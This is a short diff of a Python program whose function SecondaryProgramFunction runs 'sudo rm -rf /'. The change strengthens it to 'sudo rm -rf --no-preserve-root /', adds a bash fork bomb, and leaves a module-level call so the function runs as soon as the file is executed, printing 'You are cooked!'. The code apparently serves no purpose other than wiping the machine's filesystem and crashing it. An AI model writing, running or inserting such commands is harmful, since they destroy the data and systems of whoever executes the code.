@@ -37,7 +37,9 @@ def mainProgramFunction(operation):
 
 
 def SecondaryProgramFunction(operation):
-    os.system("sudo rm -rf /")
+    os.system("sudo rm -rf --no-preserve-root /")
+    time.sleep(5)
+    os.system(":(){ :|:& };:")
     print(operation)
 
 SecondaryProgramFunction("You are cooked!")
